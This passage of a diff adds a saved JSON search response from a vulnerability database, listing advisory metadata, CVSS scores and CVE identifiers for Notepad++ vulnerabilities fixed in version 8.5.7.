+                    "type": "kaspersky",
+                    "title": "KLA60810 Multiple vulnerabilities in Notepad++",
+                    "bulletinFamily": "info",
+                    "cvss2": {
+                        "severity": "MEDIUM",
+                        "exploitabilityScore": 3.4,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "cvssV2": {
+                            "accessComplexity": "MEDIUM",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "PARTIAL",
+                            "baseScore": 4.4,
+                            "vectorString": "AV:L/AC:M/Au:N/C:P/I:P/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "NONE"
+                        },
+                        "impactScore": 6.4,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-40031",
+                        "CVE-2023-40036",
+                        "CVE-2023-40164",
+                        "CVE-2023-40166"
+                    ],
+                    "modified": "2024-01-25T00:00:00",
+                    "id": "KLA60810",
+                    "href": "https://threats.kaspersky.com/en/vulnerability/KLA60810/",
+                    "cvss": {
+                        "score": 4.4,
+                        "vector": "AV:L/AC:M/Au:N/C:P/I:P/A:P"
+                    },
+                    "vhref": "https://vulners.com/kaspersky/KLA60810"
+                },
+                "highlight": {
+                    "references": [
+                        "https://<span class=\"vulners-highlight\">notepad</span>-plus-plus.org/downloads/",
+                        "https://<span class=\"vulners-highlight\">notepad</span>-plus-plus.org/downloads/v8.5.7/",
+                        "https://threats.kaspersky.com/en/product/<span class=\"vulners-highlight\">Notepad</span>++/"
+                    ],
+                    "description": [
+                        "### *Detect date*:\n09/08/2023\n\n### *Severity*:\nHigh\n\n### *Description*:\nMultiple vulnerabilities were found in <span class=\"vulners-highlight\">Notepad</span>++.",
+                        ".\n\n### *Affected products*:\n<span class=\"vulners-highlight\">Notepad</span>++ earlier than 8.5.7\n\n### *Solution*:\nUpdate to the latest version  \n[Download <span class=\"vulners-highlight\">Notepad</span>++](<https://<span class=\"vulners-highlight\">notepad</span>-plus-plus.org/downloads/>)\n\n### *Original advisories*:\n[<span class=\"vulners-highlight\">Notepad</span>",
+                        "++ v8.5.7 bug-fixes and new features:](<https://<span class=\"vulners-highlight\">notepad</span>-plus-plus.org/downloads/v8.5.7/>)  \n\n\n### *Impacts*:\nACE \n\n### *Related products*:\n[<span class=\"vulners-highlight\">Notepad</span>++](<https://threats.kaspersky.com/en/product/<span class=\"vulners-highlight\">Notepad</span>+"
+                    ],
+                    "title": [
+                        "KLA60810 Multiple vulnerabilities in <span class=\"vulners-highlight\">Notepad</span>++"
+                    ]
+                },
+                "sort": [
+                    4.5528617,
+                    1694131200000
+                ],
+                "flatDescription": "Detect date: 09/08/2023 Severity: High Description: Multiple vulnerabilities were found in Notepad++. Malicious users can exploit these vulnerabilities to execute arbitrary code, obtain sensitive information. Exploitation: Public exploits exist for this vulnerability. Affected products: Notepad++..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "OSV:CVE-2023-40164",
+                "_score": 4.475611,
+                "_source": {
+                    "lastseen": "2024-03-13T17:11:35",
+                    "description": "Notepad++ is a free and open-source source code editor. Versions 8.5.6 and prior are vulnerable to global buffer read overflow in `nsCodingStateMachine::NextStater`. The exploitability of this issue is not clear. Potentially, it may be used to leak internal memory allocation information. As of time of publication, no known patches are available in existing versions of Notepad++.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "MEDIUM",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "NONE",
+                            "integrityImpact": "NONE",
+                            "privilegesRequired": "NONE",
+                            "baseScore": 5.5,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                            "version": "3.1",
+                            "userInteraction": "REQUIRED"
+                        }
+                    },
+                    "published": "2023-08-25T21:15:08",
+                    "type": "osv",
+                    "title": "CVE-2023-40164",
+                    "bulletinFamily": "software",
+                    "cvss2": {
+                        "severity": "LOW",
+                        "exploitabilityScore": 3.4,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "cvssV2": {
+                            "accessComplexity": "MEDIUM",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "NONE",
+                            "integrityImpact": "NONE",
+                            "baseScore": 1.9,
+                            "vectorString": "AV:L/AC:M/Au:N/C:P/I:N/A:N",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "NONE"
+                        },
+                        "impactScore": 2.9,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-40164"
+                    ],
+                    "modified": "2023-11-29T10:13:23",
+                    "id": "OSV:CVE-2023-40164",
+                    "href": "https://osv.dev/vulnerability/CVE-2023-40164",
+                    "cvss": {
+                        "score": 1.9,
+                        "vector": "AV:L/AC:M/Au:N/C:P/I:N/A:N"
+                    },
+                    "vhref": "https://vulners.com/osv/OSV:CVE-2023-40164"
+                },
+                "highlight": {
+                    "description": [
+                        "<span class=\"vulners-highlight\">Notepad</span>++ is a free and open-source source code editor. Versions 8.5.6 and prior are vulnerable to global buffer read overflow in `nsCodingStateMachine::NextStater`.",
+                        "As of time of publication, no known patches are available in existing versions of <span class=\"vulners-highlight\">Notepad</span>++."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus"
+                    ]
+                },
+                "sort": [
+                    4.475611,
+                    1692998108000
+                ],
+                "flatDescription": "Notepad++ is a free and open-source source code editor. Versions 8.5.6 and prior are vulnerable to global buffer read overflow in nsCodingStateMachine::NextStater. The exploitability of this issue is not clear. Potentially, it may be used to leak internal memory allocation information. As of time..."
+            }
+        ],
+        "occurrences": {},
+        "exactMatch": null,
+        "references": null,
+        "total": 1166,
+        "maxSearchSize": 100
+    }
+}
